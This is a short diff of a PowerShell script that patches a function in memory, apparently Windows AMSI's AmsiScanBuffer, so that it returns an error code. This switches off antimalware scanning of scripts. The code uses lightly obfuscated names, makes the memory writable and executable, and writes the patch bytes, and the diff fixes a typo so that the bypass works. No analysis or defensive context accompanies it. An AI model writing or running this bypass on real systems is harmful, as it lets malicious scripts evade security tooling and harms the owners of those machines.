@@ -27,4 +27,4 @@ $sserddA = [Win32]::GetProcAddress($LoadLibrary, $asb)
 $qqq = 0
 [Win32]::VirtualProtect($sserddA, [uint32]5, 0x40, [ref]$qqq)
 $PieceOfTape = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
-[System.Runtime.InteropServices.Marshal]::Copy(PieceOfTape, 0, $sserddA, 6)
+[System.Runtime.InteropServices.Marshal]::Copy($PieceOfTape, 0, $sserddA, 6)
